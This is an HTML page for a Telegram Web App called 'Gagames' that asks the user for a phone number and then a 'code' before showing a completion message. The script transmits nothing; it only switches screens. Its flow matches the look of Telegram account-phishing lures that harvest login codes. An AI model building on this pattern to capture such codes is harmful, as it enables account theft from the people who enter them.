<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>Gagames</title>

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
:root {
    --bg: #0a0a0c;
    --panel: #111114;
    --border: #1e1e25;
    --text: #e8e8e8;
    --muted: #8b8b8b;
    --accent: #ffffff;
}

* {
    box-sizing: border-box;
    font-family: Inter, system-ui, -apple-system, Arial, sans-serif;
}

body {
    margin: 0;
    height: 100vh;
    background: var(--bg);
    color: var(--text);
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    padding:
        env(safe-area-inset-top)
        env(safe-area-inset-right)
        env(safe-area-inset-bottom)
        env(safe-area-inset-left);
}

/* LOGO */
.logo {
    position: fixed;
    top: 18px;
    left: 22px;
    display: flex;
    align-items: center;
    gap: 10px;
    opacity: 0;
    animation: fadeIn 0.8s ease forwards;
}

.logo svg {
    width: 20px;
    height: 20px;
}

.logo span {
    font-size: 14px;
    font-weight: 500;
    letter-spacing: 0.4px;
}

/* CARD */
.card {
    width: 100%;
    max-width: 360px;
    background: var(--panel);
    border: 1px solid var(--border);
    padding: 30px 24px 32px;
    animation: slideUp 0.6s ease forwards;
}

h2 {
    font-weight: 400;
    font-size: 18px;
    margin-bottom: 22px;
    text-align: center;
}

input {
    width: 100%;
    padding: 14px 12px;
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text);
    font-size: 16px;
    margin-bottom: 16px;
    transition: border 0.2s ease;
}

input:focus {
    outline: none;
    border-color: #2a2a35;
}

input::placeholder {
    color: var(--muted);
}

button {
    width: 100%;
    padding: 14px;
    background: var(--accent);
    color: #000;
    border: none;
    font-size: 15px;
    font-weight: 500;
    cursor: pointer;
    transition: transform 0.15s ease, opacity 0.15s ease;
}

button:active {
    transform: scale(0.98);
    opacity: 0.9;
}

/* LOADER */
.loader {
    display: flex;
    justify-content: center;
    gap: 6px;
    margin-top: 10px;
}

.dot {
    width: 6px;
    height: 6px;
    background: var(--text);
    border-radius: 50%;
    animation: bounce 1.2s infinite ease-in-out;
}

.dot:nth-child(2) { animation-delay: .15s }
.dot:nth-child(3) { animation-delay: .3s }

.hidden {
    display: none;
}

/* ANIMATIONS */
@keyframes fadeIn {
    to { opacity: 1; }
}

@keyframes slideUp {
    from {
        opacity: 0;
        transform: translateY(14px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes bounce {
    0%, 80%, 100% { transform: scale(0); }
    40% { transform: scale(1); }
}

/* Mobile */
@media (max-width: 480px) {
    .card {
        margin: 0 12px;
    }
}
</style>
</head>

<body>

<!-- LOGO -->
<div class="logo">
    <!-- SVG ICON -->
    <svg viewBox="0 0 24 24" fill="none">
        <rect x="3" y="3" width="18" height="18" rx="4" stroke="white" stroke-width="1.5"/>
        <path d="M8 12h8" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
        <path d="M12 8v8" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
    </svg>
    <span>Gagames</span>
</div>

<!-- CARD -->
<div class="card" id="card">
    <h2 id="title">Введите ваш номер</h2>
    <input id="input" placeholder="+79991234567" inputmode="tel">
    <button id="btn">Продолжить</button>

    <div class="loader hidden" id="loader">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
    </div>
</div>

<script>
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
}

let step = 1;
const input = document.getElementById("input");
const title = document.getElementById("title");
const btn = document.getElementById("btn");
const loader = document.getElementById("loader");

btn.onclick = () => {
    if (!input.value.trim()) return;

    if (step === 1) {
        btn.classList.add("hidden");
        input.classList.add("hidden");
        loader.classList.remove("hidden");

        setTimeout(() => {
            loader.classList.add("hidden");
            title.innerText = "Введите код";
            input.value = "";
            input.placeholder = "Код";
            input.inputMode = "numeric";
            input.classList.remove("hidden");
            btn.classList.remove("hidden");
            step = 2;
        }, 1600);
    } else {
        title.innerText = "Готово!";
        input.classList.add("hidden");
        btn.classList.add("hidden");
    }
};
</script>

</body>
</html>
